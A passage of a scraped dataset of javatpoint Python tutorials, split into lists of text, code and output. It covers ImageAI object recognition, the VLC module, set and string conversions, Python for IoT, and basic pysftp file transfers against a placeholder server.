from the ImageAI library. The syntax for the same is shown below:', 'File: recognizer.py', 'File: recognizer.py', 'Let us specify the path from the model, input image, and output image using the following snippet of code.', 'File: recognizer.py', 'Let us consider the following snippet of code for the same:', 'File: recognizer.py', 'Now, we will be going to call the function setModelPath(). This function will accept a string that consists of the path to the pre-trained model.', 'Let us consider the following snippet of code for the same:', 'File: recognizer.py', 'Let us consider the following snippet of code for the same.', 'File: recognizer.py', 'We have to call the detectObjectsFromImage() function with the help of the recognizer object that we created earlier.', 'The syntax for the same is shown below:', 'File: recognizer.py', 'At last, we can access the dictionary elements by iterating through each element present in the dictionary.', 'The syntax for the same is shown below:', 'File: recognizer.py', 'Let us consider the following script for the Object Recognition model.', 'File: recognizer.py', 'Actual Image:', 'Image after Object Recognition:', 'At last, we can observe that ImageAI has successfully identified cars and persons in the image.']","['Techniques of Deep learning have been shown state of the art for different problems related to Object Recognition. Some of the generally used approaches of deep learning for object recognition are as follows:', 'ImageAI makes use of several APIs that work offline - it has object detection, video detection, and object tracking APIs that can be called without accessing the Internet. ImageAI uses a pre-trained model and can easily be customized.', ""In order to utilize ImageAI, we have to install some dependencies. The initial step is to have Python installed on the system. We can download and install Python 3 from Python's official website: https://www.python.org/."", 'In this section, we will discuss how we can utilize the ImageAI library in Python. The procedure of performing Object Recognition is divided into several steps for better understanding and clarity.', 'For the second step, we will open the preferred text editor, which is Visual Studio Code, in this case, to write a Python script and create a new file recognizer.py', 'Now that the required ImageAI library is imported and the ObjectDetection class, the next thing is to create an instance of the class ObjectDetection. Let us consider the following snippet of code for the same.', 'Once, we instantiated the ObjectDetection class we can now call different functions from the class. The class consists of the following functions in order to call pre-trained models:', ""For this tutorial's purpose, we will utilize the pre-trained TinyYOLOv3 model, and thus, we will be using the setModelTypeAsTinyYOLOv3() function in order to load the model."", 'In this step, we will call the loadModel() function from the recognizer instance. This function will load the model from the path specified above with the help of the setModelPath() class method.']","['In the following tutorial, we will understand how to perform Object Recognition in the Python programming language using the ImageAI library. We will create a basic object recognition model using the ImageAI library in Python by the end of this tutorial.', 'Python offers a library built to empower programmers and developers for building applications and systems with self-contained deep learning and Computer Vision capabilities with the help of some lines of simple coding script. ImageAI consists of Python implementation of nearly all state-of-the-art deep learning algorithms such as RetinaNet, YOLOv3, and TinyYOLOv3.', 'The ObjectDetection class of the ImageAI library consists of methods in order to perform object detection on any image or set of images with the help of pre-trained models. With ImageAI, we can detect and recognize eighty distinct types of common, everyday objects.', 'This function accepts two parameters: input_image and output_image_path. The input_image parameter is the path where the image we recognise is situated, whereas the output_image_path parameter is the path storing the image with detected objects. This function will return a diction containing the names and percentage probabilities of every object detected in the image.']","['# installing OpenCV', '$ pip install opencv-python', '# installing TensorFlow', '$ pip install tensorflow', '# installing Keras', '$ pip install keras', '# installing ImageAI', '$ pip install imageAI', '?\tInput', '?\tModels', '?\tOutput', '3 directories, 0 files', '# importing the required library', 'from imageai.Detection import ObjectDetection', '# instantiating the class', 'recognizer = ObjectDetection()', '# defining the paths', 'path_model = ""./Models/yolo-tiny.h5""', 'path_input = ""./Input/images.jpg""', 'path_output = ""./Output/newimage.jpg""', '# using the setModelTypeAsTinyYOLOv3() function', 'recognizer.setModelTypeAsTinyYOLOv3()', '# setting the path to the pre-trained Model', 'recognizer.setModelPath(path_model)', '# loading the model', 'recognizer.loadModel()', '# calling the detectObjectsFromImage() function', 'recognition = recognizer.detectObjectsFromImage(', 'input_image = path_input,', 'output_image_path = path_output', '# iterating through the items found in the image', 'for eachItem in recognition:', 'print(eachItem[""name""] , "" : "", eachItem[""percentage_probability""])', '# importing the required library', 'from imageai.Detection import ObjectDetection', '# instantiating the class', 'recognizer = ObjectDetection()', '# defining the paths', 'path_model = ""./Models/yolo-tiny.h5""', 'path_input = ""./Input/images.jpg""', 'path_output = ""./Output/newimage.jpg""', '# using the setModelTypeAsTinyYOLOv3() function', 'recognizer.setModelTypeAsTinyYOLOv3()', '# setting the path of the Model', 'recognizer.setModelPath(path_model)', '# loading the model', 'recognizer.loadModel()', '# calling the detectObjectsFromImage() function', 'recognition = recognizer.detectObjectsFromImage(', 'input_image = path_input,', 'output_image_path = path_output', '# iterating through the items found in the image', 'for eachItem in recognition:', 'print(eachItem[""name""] , "" : "", eachItem[""percentage_probability""])']","['car  :  88.85036110877991', 'car  :  85.83406209945679', 'bus  :  70.04978060722351', 'car  :  80.88288903236389', 'car  :  55.334705114364624', 'person  :  61.084866523742676', 'car  :  68.46083402633667', 'person  :  56.165677309036255', 'person  :  71.58655524253845', 'car  :  59.49597954750061', 'person  :  55.276620388031006', 'person  :  69.08922791481018', 'person  :  59.92640256881714', 'car  :  82.73208141326904', 'person  :  54.69227433204651', 'person  :  67.25137233734131', 'car  :  68.9003050327301', 'person  :  77.32996344566345', 'person  :  53.02640199661255', 'person  :  81.33729696273804', 'person  :  83.60849618911743', 'person  :  50.34937262535095']",[],['|||Identification of all objects that exist in an image|||Filtration of the object that seeks attention||||||ImageAI|||Single Shot Detectors|||YOLO (You Only Look Once)|||Region-based Convolutional Neural Networks||||||OpenCV|||TensorFlow|||Keras|||ImageAI||||||Object_Recognition: This will be the root folder.|||Models: This folder will store the pre-trained model.|||Input: This folder will store the image file on which we have to perform object detection.|||Output: This folder will store the image file with detected objects.||||||setModelTypeAsRetinaNet()|||setModelTypeAsYOLOv3()|||setModelTypeAsTinyYOLOv3()|||']
320,['Python VLC module'],"['In the following tutorial, we will understand the VLC module in the Python programming language. We will also perform some examples based on the Python VLC module.']","['https://www.javatpoint.com/set-to-list-in-python', 'https://www.javatpoint.com/object-recognition-using-python', 'https://www.javatpoint.com/set-to-list-in-python', 'https://www.javatpoint.com/object-recognition-using-python', 'https://www.javatpoint.com/set-to-list-in-python']",[],[],"['Understanding the VLC module in Python', 'How to install the VLC module?', 'Some examples of the VLC module']",['Fixing errors that may occur while importing the VLC module'],['Note: The VLC media player must be installed on the user system before using the VLC module in Python.'],"[""So, let's get begun."", 'We can utilize the VLC media player with the help of Python as well. Python offers a supported module known as VLC.', 'In order to install the VLC module in Python, we will use the pip installer following the command shown below:', 'Let us consider a simple program to play Video using VLC.', 'Explanation:', 'Now, let us consider another example deriving the duration of a video file using the VLC module.', 'Explanation:']","['Once the installation is completed, we can verify it by importing the VLC module into a Python script. Let us consider the following syntax for the same:', 'Now, we have to save the file and run it. If the program does not raise any error, the module is installed properly. However, if not, it is recommended to reinstall the module and read the official documentation for more details.', 'In the above snippet of code, we have imported the VLC module. We have then created an object of the VLC media player. At last, we have used the play() function in order to play the video.']","['The VLC media player is an open-source and free media player software that is portable and can be used on multiple platforms. The VLC media player is also a stream media server designed and developed by the VideoLAN project. VLC is a media player available on desktop operating systems, like Windows, Linux, and MacOS, as well as mobile platforms, like Android, iOS, iPadOS, Windows 10 mobile, Windows Phone, and Tizen.', 'In the above snippet of code, we have imported the time and VLC module. We have then defined a function to play the video. Within the function, we have created an instance and a media player. We have then created a media and set it to the player. We have then played the video and set the waiting time to 0.5. We have then stored the duration of the video and printed it for the users. At last, we have called the defined function.']","['$ pip install python-vlc', '# importing the vlc module', 'import vlc', ""os.add_dll_directory(r'C:\\Program Files\\VideoLAN\\VLC')"", '# importing the vlc module', 'import vlc', '# creating the vlc media player object', 'my_media = vlc.MediaPlayer(""video.mp4"")', '# playing video', 'my_media.play()', '# importing the time and vlc modules', 'import time, vlc', '# defining the method to play video', 'def vlc_video(src):', '# creating an instance of vlc', 'vlc_obj = vlc.Instance()', '# creating a media player', 'vlcplayer = vlc_obj.media_player_new()', '# creating a media', 'vlcmedia = vlc_obj.media_new(src)', '# setting media to the player', 'vlcplayer.set_media(vlcmedia)', '# playing the video', 'vlcplayer.play()', '# waiting time', 'time.sleep(0.5)', '# getting the duration of the video', 'video_duration = vlcplayer.get_length()', '# printing the duration of the video', 'print(""Duration : "" + str(video_duration))', '# calling the video method', 'vlc_video(""video.mp4"")']",['Duration : 465351'],[],"['|||In case the path is not defined, the issue is that dll is not in the PATH (System Variable). We have to include the libvlc.dll file path to the system variable to solve the problem. We can find this file in the VLC folder where it is installed.|||Wrong version of VLC: Generally, users install 32 bits version of VLC, which may cause some trouble if we have installed the 64 bits version of Python. All we have to reinstall the 64 bits version of VLC in order to fix this.|||We can import the OS module before the VLC module and register dll using the following syntax:|||']"
321,['Set to list in Python'],"['In this article, we will discuss how we can convert a set to a list in Python.']","['https://www.javatpoint.com/string-to-int-in-python', 'https://www.javatpoint.com/python-vlc-module', 'https://www.javatpoint.com/string-to-int-in-python', 'https://www.javatpoint.com/python-vlc-module', 'https://www.javatpoint.com/string-to-int-in-python']",[],[],['Conclusion'],"['Using list()', 'Using sorted()', 'Using *set', 'Using for loop', 'Using frozenset']",['NOTE: The list is mutable which means we can change its elements.'],"[""Before that let's have a quick revision of lists and sets."", 'List - It is a sequence of elements enclosed in square brackets where each element is separated with a comma.', 'Syntax of a list is-', 'We can print the list and check its type using-', 'Set - It is an unordered collection of elements that contains all the unique values enclosed within curly brackets.', 'Syntax of a set is-', 'We can print the set and check its type using-', 'The different approaches of converting a set to a string that we will use are-', 'In the first method, we will use list() to convert the set.', 'The following program shows how it can be done-', 'Explanation:', 'Let us understand what we have done in the above program-', 'The second approach is to use the sorted() function to convert a set to a list.', 'The program below illustrates the same-', 'Explanation:', 'Let us understand what we have done in the above program-', 'In the third method, we will use the *set to convert a set to a list in Python.', 'The *set unpacks the set inside a list.', 'The following program shows how it can be done-', 'Explanation:', 'Let us understand what we have done in the above program-', 'In the fourth method, we will use for loop to convert a set to a list in Python.', 'The program below illustrates the same-', 'Let us understand what we have done in the above program-', 'Finally, in the last method, we will use frozenset to convert a set to a list in Python.', 'The difference between a set and a frozenset is that a set is mutable whereas a frozenset is immutable.', 'The following program shows how it can be done-', 'Explanation:', 'Let us understand what we have done in the above program-', 'In this tutorial, we came across the different approaches of converting a set to a list in Python.']",[],[],"[""a = [1,2,4.5,'Python','Java']"", 'print(a)', 'print(type(a))', ""b = {1,2,4.5,'Python','Java'}"", 'print(b)', 'print(type(b))', '#declaring a set', ""subjects={'C','C++','Java','Python','HTML'}"", '#using list()', 'res=list(subjects)', 'print(res)', '#defining a function', 'def convert_set(set):', 'return sorted(set)', ""subjects={'C','C++','Java','Python','HTML'}"", 'res = set(subjects)', 'print(convert_set(res))', '#defining a function', 'def convert_set(set):', 'return [*set, ]', ""res = set({'C','C++','Java','Python','HTML'})"", 'print(convert_set(res))', '#using for loop', ""subjects = set({'C','C++','Java','Python','HTML'})"", 'res = []', 'for i in subjects:', 'res.append(i)', ""subjects = frozenset({'C','C++','Java','Python','HTML'})"", 'res = list(subjects)', 'print(res)']","[""['C','C++','Java','Python','HTML' ]"", ""['C','C++','Java','Python','HTML' ]"", ""['C','C++','Java','Python','HTML' ]"", ""['C','C++','Java','Python','HTML' ]"", ""['C','C++','Java','Python','HTML' ]""]",[],"[""|||Using list()|||Using sorted()|||Using *set|||Using for loop|||Using frozenset||||||The first thing that we have done here is to declare the set that consists of different subject names.|||After this, we have used list() function in which we passed the set 'subjects'.|||On executing the program, the desired output is displayed.||||||The first thing that we have done here is, we created a function that takes a set as its parameter and returns the expected output.|||After this, we have declared the variable of a set type that consists of different subject names.|||The next step was to pass our set in the function 'convert_set'.|||On executing the program, the desired output is displayed.||||||The first thing that we have done here is, we created a function that takes a set as its parameter and returns the expected output.|||After this, we have passed the value of the set that consists of different subject names inside the set().|||The next step was to pass our set in the function 'convert_set'.|||On executing the program, the desired output is displayed.||||||The first thing that we have done here is to declare the set that consists of different subject names.|||After this, we have declared an empty list res.|||We have used for loop here, that took each element from the set and added it to the list.|||On executing the program, the desired output is displayed.||||||The first thing that we have done here is to declare the frozenset that consists of different subject names.|||After this, we have used list() in which we passed the set 'subjects'.|||On executing the program, the desired output is displayed.|||""]"
322,['String to int in Python'],"['In this tutorial, we will learn the ways of converting a string to integer in Python-']","['https://www.javatpoint.com/internet-of-things-with-python', 'https://www.javatpoint.com/set-to-list-in-python', 'https://www.javatpoint.com/internet-of-things-with-python', 'https://www.javatpoint.com/set-to-list-in-python', 'https://www.javatpoint.com/internet-of-things-with-python']",[],[],['Conclusion'],"['Approach-2', 'Approach-3:']",[],"['Let us have a look at an example before proceeding-', ""In the above example, we have declared the variables 'a' and 'b' with a string and an integer value respectively."", 'We can verify their data types using type().', 'The question that arises here is why do we need to convert a string to an integer.', 'The following program illustrates the same-', ""It's time to have a look at the first program that demonstrates converting a string to an integer."", 'Explanation:', ""Let's see the explanation of the above program-"", 'In the next example, we will go for an indirect approach of converting a string to an integer.', 'The following program shows how it can be done-', 'Explanation:', 'Let us understand what we have done in the above program-', 'In the last program, we will discuss one more scenario of converting string to int in Python.', 'Here we will see how we can convert a number present as a string value to base 10 when it is on different bases.', 'The following program illustrates the same-', 'Explanation:', ""It's time to have a glance at the explanation of the above program."", 'In this tutorial, we learned the different ways of converting a string to an int value.']","['Since it generates this type of error, this is the reason that we must convert the string values to integers so that we can easily proceed with the operations.']",[],"[""a='Learning Python is fun'"", '#Displaying the type of a and b', 'print(type(a))', 'print(type(b))', 'value_a = ""100""', 'value_b = ""26""', 'res = value_a * value_b', 'print(""The multiplication of val_a and val_b gives: "",res)', ""a = '7'"", 'print(type(a))', '#using int()', 'conv_a=int(a)', 'print(type(conv_a))', 'conv_a = conv_a+10', 'print(conv_a)', 'print(type(conv_a))', 'value_a = ""100""', 'value_b = ""26""', 'print(type(value_a))', 'print(type(value_b))', '#converting to float', 'value_a=float(value_a)', '#converting to int', 'value_b=int(value_b)', 'res_sum=value_a+value_b', 'print(""The sum of value_a and value_b is "",res_sum)', ""num_value = '234'"", '# printing the value of num_value', ""print('The value of num_value is :', num_value)"", '#converting 234 to base 10 assuming it is in base 10', ""print('The value of num_value from base 10 to base 10 is:', int(num_value))"", '#converting 234 to base 10 assuming it is in base 8', ""print('The value of num_value from base 8 to base 10 is :', int(num_value, base=8))"", '#converting 234 to base 10 assuming it is in base 6', ""print('The value of num_value base 6 to base 10 is :', int(num_value, base=6))""]","[""<class 'str'>"", ""<class 'int'>"", 'res = value_a * value_b', ""TypeError: can't multiply sequence by non-int of type 'str'"", ""<class 'str'>"", ""<class 'int'>"", '17', ""<class 'int'>"", ""<class 'str'>"", ""<class 'str'>"", 'The sum of value_a and value_b is  126.0', 'The value of num_value is: 234', 'The value of num_value from base 10 to base 10 is: 234', 'The value of num_value from base 8 to base 10 is: 156', 'The value of num_value base 6 to base 10 is: 94']",[],"[""|||The first step is to declare the variable 'a' with a string value.|||After this, we have checked its data type using type().|||For converting the string to an integer, we have used int() and then checked its type.|||Now we have operated on the variable 'a' by adding 10 to it.|||Finally, the resultant value is displayed in the output.||||||The first step is to declare the two variables 'value_a' and 'value_b' with a string value.|||After this, we have checked their data type using type().|||For converting the string to an integer, we have used float() to convert the string to float value.|||In the next step, we will convert the string value of 'value_b' to an integer.|||Now we have added 'value_a' and 'value_b' and printed their sum.|||Finally, the resultant value is displayed in the output.||||||In the first step, we have declared the value of the variable.|||Since the output will always be in base 10, we have provided the different base values inside int().|||The base values we have taken here are 10, 8, and 6.|||On executing the program, the expected output is displayed.|||""]"
323,['Internet of Things with Python'],"['Generally, prototypes or real-life Internet of Things (IoT) systems have to be designed and developed swiftly and competently. Whenever this occurs, two activities instantly come to life: One is to program the IoT devices, and another is to organize a backend to interact with these devices.']","['https://www.javatpoint.com/python-pysftp-module', 'https://www.javatpoint.com/string-to-int-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/iot-internet-of-things', 'https://www.javatpoint.com/python-pysftp-module', 'https://www.javatpoint.com/string-to-int-in-python', 'https://www.javatpoint.com/python-pysftp-module']",[],[],"['Understand the importance of the Internet of Things', 'Why use Python in the Internet of Things?', 'What are the best solutions for IoT in Python?', 'Understanding the use of Python in IoT Backend']","['Python on Raspberry Pi', 'Python on PyBoard', 'ESP8266, ESP32 with MicoPython', 'MQTT protocol with Python', 'IoT backend on Flask in Python', 'Microsoft Azure IoT backend in Python']",[],"['But before we get to that, let us briefly discuss the importance of IoT.', 'Back in the day, we could explain IoT with examples as shown below:', '""We can utilize the phone to turn a light bulb on and off in the room.""', 'Some of the best solutions for IoT in the Python programming language are as follows:', 'We will discuss each solution in brief.', 'Let us consider the following snippet of Python code where we have used the GPIO Zero library in order to control the I/O ports.', 'Explanation:', 'The above example demonstrates the receiving and processing of the signals by pressing the button on the second pin at the moment of release.', 'Another great solution for Python in IoT devices is the PyBoard with an STM32F405RG microcontroller.', ""The board's dimensions are impressive, taking up around two quarters, 33mm x 43mm and weighing only 6 grams."", 'Let us consider the following example to see how simple the script might look like:', 'Explanation:', 'We can use Python as a Backend programming language for the Internet of Things in many ways. Some of them are as follows:', 'One of the most popular connection methods for IoT devices is MQTT, and it is a protocol used for effective implementation with Python.', 'The Python client library called Eclipse Paho MQTT implements versions 3.1, 3.1.1, and 5.0 of the MQTT protocol.', 'The Extension of IoT offers programmers command-line access to the capabilities of the IoT Edge, IoT Hub and IoT Hub Device Provisioning Service.']","['In the following tutorial, we will understand the use of Python in programming Internet of Things (IoT) devices and create a backend for them to work.', 'Nowadays, hardly anyone would be amazed by a smart electricity meter that transmits readings of the consumption of the electricity, uploads that information to the cloud, and produces monthly bills sent directly to the e-mail.', 'Some of the many benefits of working with Python for IoT devices are a large number of libraries for all types of platforms and the speed it offers at which we can develop the code.', 'Python is a great ally for developing device prototypes. Even if we rewrite some of the scripts while producing to C, C++ or Java to improve performance, the system will generally function perfectly in Python.', 'The primary objective of running Python on an IoT device that pops up in mind is grabbing the Raspberry Pi from the table. Python is pre-installed in the operating system, and the only objective left for us is to write the coding script.', 'The benefits of utilizing this approach are the availability of a large variety of development utilities, libraries and communications for the most complex devices based on Raspberry Pi involving video processing from cameras.', 'MicroPython is an entire rewrite of the Python (version 3.4) programming language to fit and execute on a microcontroller. It involves various optimization for efficiency and consumes quite less RAM.', 'Once we installed Python on the system, we can use the pip installer in the command line in order to install the esptool module. The syntax for the same is shown below:', 'The installation procedure of the MicroPython is pretty easy. We can download the firmware from the website and install it with the help of esptool, not forgetting to format the board before installing it.', 'We can also use one of the IDEs used for developing with MircoPython. The complete procedure of development is carried out on a working computer, and then it is compiled and saved in the memory of an ESP8266 or ESP32 microcontroller.', 'In the above snippet of code, we have imported the Pin module from the machine library along with the time module. We have then created an object of Pin and execute some functions on it.', 'Moreover, this library supports Python 2.7.9 and above or 3.5 and above. The integration of images with older 2.7 versions of Python is straightforward.', 'We can start by deciding the requests we have to serve from the IoT devices. We then have to set up the Flask microframework and write a block of code. The GET method will then return information as per the request from the side of the client.', 'Microsoft has released a new open-source extension for IoT to extend the capabilities of Azure CLI 2.0. Azure CLI 2.0 involves commands to interact with the Azure Resource Manager and endpoints of management.', 'For instance, we can utilize Azure CLI 2.0 to build an Azure Virtual Machine or IoT Hub. The extension of CLI allows an Azure service to complement Azure CLI by providing users access to additional capabilities specified to services.', 'Azure CLI 2.0 allows instant management of resources of Azure IoT Hub, devices provisioning services instances, and associated hubs. The new IoT extension enriches Azure CLI 2.0 with features such as device management and all IoT Edge capabilities:']","['In both activities, we can utilize the Python programming language for their development. Or we can utilize a functional and practical edition of MicroPython in order to work on devices with small computing resources, and accordingly, at a very low price.', 'The term ""Internet of Things"" was first coined in the year 1999 by Kevin Ashton. Ever since the importance and scale of IoT have exploded, one of the chief indicators is that the market size of the IoT was $151 billion in 2018, with a steady increment year after year. As per the predictions of marketers, the IoT market could cross the $561 billion mark by 2022.', 'IoT is increasingly utilized across industries in order to streamline processes and make them more efficient. For instance, manufacturing production lines and agriculture are great examples of various industries taking benefit of the different features of IoT. In the particular scenario of agriculture, IoT helps in coordinating harvesters with trucks that have elevators to handle grains efficiently.', 'For many developers, Python is considered as the language of preference in the market. It is simple to learn, has clean syntax, and has a large online community supporting it. Python becomes a great choice when it comes to IoT. We can either use it for the backend side of development or the software development of devices. Moreover, Python is available to work on Linux devices, and we can make use of MicroPython for microcontrollers.', 'Python is the coding language that we can use to reduce the volume of data that we need to deal with, accessible in the cloud. Python recognizes the needs regardless of whether we create the IoT project from scratch or interact with actuators, sensors, and accessories.', 'In this scenario, we can control the I/O ports on the expansion bar of the Raspberry Pi. Fortunately, the board supports wireless communication (Bluetooth and WiFi) and Ethernet. We can also connect a monitor to the HDMI output, a specialized 3.2"" 320x240 TFT LCD, or a low energy consumption E-Ink 2.13"" 250x122 display for Raspberry Pi.', 'There are controllers available in a large variety of computing power and budgets. We can choose these controllers for the IoT system - ranging from the fast Raspberry Pi 4 Model B 8 GB to the smallest Raspberry Pi Zero, all supporting the Python programming language. In case of necessity, we can install the earlier version of Python 2.7 for past compatibility.', 'The PyBoard is considered a compact as well as a powerful electronics development board. It works on MicroPython. The PyBoard connects to the PC through USB, providing us with a USB flash drive to store the Python scripts and a serial Python prompt (a REPL) for instant programming. This works with Windows, MacOS, and Linux.', 'PyBoard executes MicroPython, which is a lightweight implementation of the standard CPython interpreter. The official documentation also says: ""MicroPython is a lean and efficient implementation of the Python 3 programming language that includes a small subset of the Python standard library and is optimized to run on microcontrollers and in constrained environments. The MicroPython pyboard is a compact electronic circuit board that runs MicroPython on the bare metal, giving you a low-level Python operating system that can be used to control all kinds of electronic projects. MicroPython is packed full of advanced features such as an interactive prompt, arbitrary precision integers, closures, list comprehension, generators, exception handling and more. Yet it is compact enough to fit and run within just 256k of code space and 16k of RAM.""', 'MicroPython executes bare-metal on the PyBoard, necessarily providing us with an Operating System based on Python. The in-built pyb module consists of functions and classes in order to control the peripherals available on the board, like I2C, UART, ADC, DAC, and SPI.', 'Another option could be using ESP8266 and ESP 32 to run Python. We have to create a device based on the Internet of Things with low power consumption, great capabilities, and integration with wireless Wi-Fi networks. More precisely, we can use MicroPython.', 'MicroPython imposes many restrictions compared to regular Python; however, in general, we can easily write the necessary functionality on the client-side and execute it effectively on ESP microcontrollers. This option is relatively more cost-effective than buying PyBoard.', 'The MQTT protocol is a machine-to-machine (M2M)/Internet of Things connectivity protocol designed as a highly lightweight publish/subscribe messaging transport. It is used to connect to remote locations where a small code footprint is needed, and network bandwidth is premium.', 'The code of the Poho library offers a client class that allows applications to link to an MQTT broker in order to publish messages, subscribe to topics, and receive published messages. It also delivers some helper functions to make things simpler in publishing one-off messages to MQTT servers.', 'We can also use the Flask microframework to write the backend for the IoT systems. The Flask microframework is a quick and hassle-free tool that easily set up server-side I/O information, and it is also packed with many functionalities that make work more efficient.', 'In several cases, we are best off focusing on the RESTful protocol while working with the IoT devices. This allows us to simplify the exchange between the components of the system and helps us to expand the system of exchanging information in the future.', 'Let us consider a task that has arisen as follows: Display information from IoT devices on a web page. The Flask microframework will rescue us again with its core template mechanism where we can design the required web page with the data display involving graphics.', 'The disadvantage of utilizing this method is the potential lack of starting the data transfer from the server to the device. Thus, the IoT must periodically and independently pull from the server. Rest easy, as there are keys to report this risk. We can utilize web sockets or a Python library for Pushsafer. PushSafer is an easy and safe way to send and receive push notifications in real-time to Android, iOS, and Windows devices (mobile as well as desktop), including internet browsers such as Google Chrome, Mozilla Firefox, Opera, and many more.']","['# importing the required modules', 'from gpiozero import Button', 'from time import sleep', '# creating an object of Button', 'the_button = Button(2)', '# using the if-else statement', 'while True:', 'if the_button.is_pressed:', 'print(""Button Pressed"")', 'else:', 'print(""Button Released"")', 'sleep(1)', '$ pip install esptool', '# importing the required modules', 'from machine import Pin', 'import time', '# creating an object of Pin', 'ledPin = Pin(2, Pin.OUT)', '# using some functions', 'while True:', 'ledPin.on()', 'time.sleep(1)', 'ledPin.off()', 'time.sleep(1)']",[],[],"['|||Python on Raspberry Pi|||Python on PyBoard|||ESP8266, ESP32 with Micropython||||||Azure CLI 2.0 IoT capabilities - Control Plane|||Managing instances of IoT Hub, consumer - groups and jobs|||Managing instances of device provisioning service, access-policies, Linked - hub and certificates|||New features for extensions - data plane|||Managing device and edge module identities and their respective twin definitions|||Querying IoT Hub for details like device and module jobs, twins, and messaging routing|||Invoking methods of device and module|||Generating SAS tokens and grabbing connection strings|||Cloud-to-device and Device-to-cloud messaging|||Device file uploading|||Device simulation for testing|||']"
324,['Python pysftp module'],"[""SFTP, abbreviated for SSH File Transfer Protocol and known as Secure File Transfer Protocol, is a network protocol that allows us to access files, transfer them and manage them over any dependable data stream. The program works on a secure channel, like SSH, that the server has already authenticated the client and that the client user's identity is available to the protocol.""]","['https://www.javatpoint.com/amazing-hacks-of-python', 'https://www.javatpoint.com/internet-of-things-with-python', 'https://www.javatpoint.com/amazing-hacks-of-python', 'https://www.javatpoint.com/internet-of-things-with-python', 'https://www.javatpoint.com/amazing-hacks-of-python']",[],[],"['Understanding the Python pysftp module', 'How to install the pysftp module?', 'Accessing SFTP Server using pysftp', 'Uploading a file using pysftp in Python', 'Downloading a remote file using pysftp in Python', 'Deleting a file using pysftp in Python']",['Verifying the Installation'],[],"['In the following tutorial, we will understand the pysftp module and its use in the Python programming language with some examples.', ""So, let's get begun."", 'Now, let us install the Python SFTP module or pysftp.', 'We can install the pysftp module with the help of the pip installer using the following command:', 'The module will be installed in the system as the version of Python and pip.', 'In order to check whether the module has been installed in the system properly or not, we can try importing the module and execute the program.', 'Once the installation is complete, create a new Python file and type the following syntax in it.', 'Now, save the file and run the file using the following command in the command prompt.', 'Then we have to switch from direction using either the chdir or cwd method and provide the first argument as the remote directory.', 'Let us consider the following example for the same.', 'Explanation:', 'Let us consider the following snippet of code for better understanding.', 'Explanation:', 'In the above snippet of code, we have established a secure connection and then defined two file paths - local_File_Path and remote_File_Path.', 'Then, we have used the sftp.put() function in order to upload a file to the server.', 'In the previous section, we have discussed the method of uploading a file using pysftp. Let us understand the method of downloading a file.', 'Let us consider the following example demonstrating the same.', 'Explanation:', 'In the above snippet of code, we have defined a connection and then defined two file paths - remote_File_Path and local_File_Path', 'We have then utilized the sftp.get() function in order to download the file.', 'Let us consider the following example demonstrating the same.', 'Explanation:', 'We have then utilized the sftp.remove() function in order to delete a file from the remote server.']","['Handling things using SFTP with the scripts can always be supportable if we work with programming languages like Python. Python offers the pysftp module that allows us to deal with this technology easily and efficiently.', 'If the program runs without raising any import error, the module is installed properly. Else it is recommended to reinstall the module and refer to its official documentation.', 'We can list the content of the direction with the help of the pysftp module in Python. In order to accomplish the goal, we need the hostname, username, and password.', 'Now, let us understand the above code. The above snippet of code is the same for anyone as we have to provide the credentials, and the program will start working.', 'We can remove a file with the help of pysftp using the sftp.remove() function. The remove() function expects the absolute path to the remote file as the first parameter.', 'In the above snippet of code, we have opened a connection and then defined a remove_File_Path variable, which consists of the path of a file that requires to be deleted.', 'The pysftp module has a large variety of functions that we can utilize to perform various activities, such as handling permissions and a lot more. One can also refer to the official documentation of the Python pysftp module.']","['Python pysftp module is a simple interface to SFTP. The module provides high-level abstractions and task-based schedules in order to handle SFTP requirements. The SFTP protocol does not support security and authentication; it expects the fundamental protocol to protect it. The SFTP is most widely utilized as a sub-system implementation of SSH protocol version 2, designed by the same working group.', 'The pysftp module works as a wrapper around Paramiko with a much more Python-influenced interface. The Paramiko library is one of the great python libraries and is considered the backbone of pysftp. The methods created by pysftp are abstractions that serve the productivity of a programmer by encapsulating various higher function use cases of interacting with SFTP. Instead of writing the script to walk directories and call get and put, dealing with not only Paramiko but OS and stat modules of Python and writing test (many snippets of code on the internet are incomplete and do not account for edge cases). The pysftp module supplies an entire library to deal with all three. Leaving us to focus on other primary tasks.', ""The pysftp interface doesn't expose most of the features of Paramiko; however, it abstracts pretty much features using a single method. In contrast, the pysftp module implements more high-level features on top of Paramiko, notably recursive file transfers."", ""The above snippet of code is a dummy server that doesn't exist. Still, in real life, we have to utilize the environment variables to fetch the original credentials in any file for security purposes and not pull all the credentials in individual files. It is recommended to put it inside the environment variables file. For instance, the .env file."", 'First, we have imported the pysftp module and then provided the variables to store the value of hostname, username and password. We have then used Python with statement to open the secure connection to the remote server by providing hostname, username, and password. If it is successful, we will switch the remote directory, fetch the listing and print one by one in the console.', ""The list is in arbitrary order, and it doesn't involve the unique entries '.' and '..'. The returned SFTPAttributes objects will have the additional field: longname, which may consist of the formatted string of the attributes of a file in UNIX format. The string's content will rely on the SFTP server."", 'We can upload a file in the remote server through SFTP with the help of pysftp using the sftp.put() function of the SFTP client. The put method expects the relative or absolute local path of the file we need to upload as the first argument and the remote path where the file should be uploaded as the second one.', 'We can download a remote file from the server with the help of pysftp by opening a connection and from the sftp instance and utilizing the get method expecting the path of a remote file that will be downloaded. The second parameter is a local path where we should store the file.']","['$ pip install pysftp', '$ python3 -m pip install pysftp', '# importing the required module', 'import pysftp', '$ python <file-name>.py', '# importing the required module', 'import pysftp', '# defining the host, username, and password', 'my_Hostname = ""welcomeblog.com""', 'my_Username = ""root""', 'my_Password = ""root""', '# using the python with statement', 'with pysftp.Connection(', 'host = my_Hostname,', 'username = my_Username,', 'password = my_Password', ') as sftp:', 'print(""Connection succesfully established ... "")', '# Switching to a remote directory', ""sftp.cwd('/var/www/vhosts/')"", ""# Obtaining structure of the remote directory '/var/www/vhosts'"", 'dir_struct = sftp.listdir_attr()', '# Printing data', 'for attr in dir_struct:', 'print(attr.filename, attr)', '# connection closed automatically at the end of the with statement', '# importing the required module', 'import pysftp', '# defining the host, username, and password', 'my_Hostname = ""welcomeblog.com""', 'my_Username = ""root""', 'my_Password = ""root""', '# using the python with statement', 'with pysftp.Connection(', 'host = my_Hostname,', 'username = my_Username,', 'password = my_Password', ') as sftp:', 'print(""Connection succesfully established ... "")', '# Defining a file that we want to upload from the local directorty', '# or absolute ""/Users/krunal/Desktop/code/pyt/app.txt""', ""local_File_Path = './app.txt'"", '# Defining the remote path where the file will be uploaded', ""remote_File_Path = '/var/backups/app.txt'"", '# Using the put method to upload a file', 'sftp.put(local_File_Path, remote_File_Path)', '# connection closed 